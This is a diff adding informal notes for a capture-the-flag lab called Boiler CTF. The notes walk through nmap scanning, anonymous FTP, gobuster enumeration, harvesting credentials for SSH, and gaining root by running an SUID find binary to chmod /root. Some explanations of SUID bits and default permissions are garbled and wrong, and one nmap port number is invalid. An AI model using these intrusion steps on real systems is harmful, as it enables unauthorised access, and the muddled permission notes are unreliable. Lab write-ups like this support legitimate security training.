@@ -65,5 +65,70 @@ enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.70.30 -oA nmap
 	contents of 3rd.txt file given 3rd ingredient ( sudo lss /root/3rd.txt
 
 =====================================================================================================================
+Boiler CTF
+
+enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.100.67 -oA nmap
+	ftp anon Anonymous login 
+	ftp port 21 open vsftpd 3.0.3
+
+	try ftp login as username Anonymous
+		ftp 10.10.100.67
+	After login success
+	ftp>ls ---> to list file, does not see any files here
+	
+	search for hidden files
+	ftp> ls -la--> found .info.txt
+	
+	Download  .info.text
+	fp> get .info.txt
+
+	ftp>exit
+
+	>cat .info.txt--> found some encoded value
+	Try decode using cyberchef website  https://gchq.github.io/CyberChef/
+	
+
+	//To find what service running on port 10000
+	nmap -p100000 10.10.100.67
+
+	10000/tcp http Minserve 1.930 (Webmin httpd)
+	
+	//To find exploitable
+	google for any available exploits and also can search using searchsploit
+
+	
+	//find highest port and service
+
+	//To find what CMS running on webserver
+	use gobuster 
+	>gobuster dir http://10.10.100.67/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 25
+
+	//based on hint enumerate further
+	>gobuster dir http://10.10.100.67/joomla/ -w /usr/share/dirb/wordlists/medium.txt -t 25
+
+	During enumeration we get unusual files like , file starts with _, try ccess that path in browser, we get index page
+
+	search on sar2html and also catthat file and see what we get information
+	got credentials , try ssh
+	ssh bastard@10.10.100.67 -p 5500 and enter password when prompt
+	after login search for any interesting file-> .secret file-> cat this file-> get another user credentials
+	ssh to second user account, and list files, get backup.sh file, cat it and get flag
+	
+	if any file has suid bit set and if any normal user executes that file , that normal user get inherits the suid property
+	in linux find command searches all files from root level
+
+	umask command in linux for assign permissions
+	suid for directory is 4, files 2, sticky bit 0
+	so find which file permission is set with suid--> find / -perm /4000 2>/dev/null
+	 ( where 4000- 4 is to check which directory have set suid , 000 is file permission by default for files 666, drectory permission by default 777)
+
+	/usr/bin/find  is having suid, othes are like false positive
+
+	To become effective user, 1) run any command with /usr/bin/find  or 2) add current user as sudo 3) change file permission to 777
+	> /usr/bin/find . -exec chmod -R 777 /root \; 
+	>ls -al /root
+	>cat root/root.txt----> get the flag
+
+==============================================================================================================================
 
 
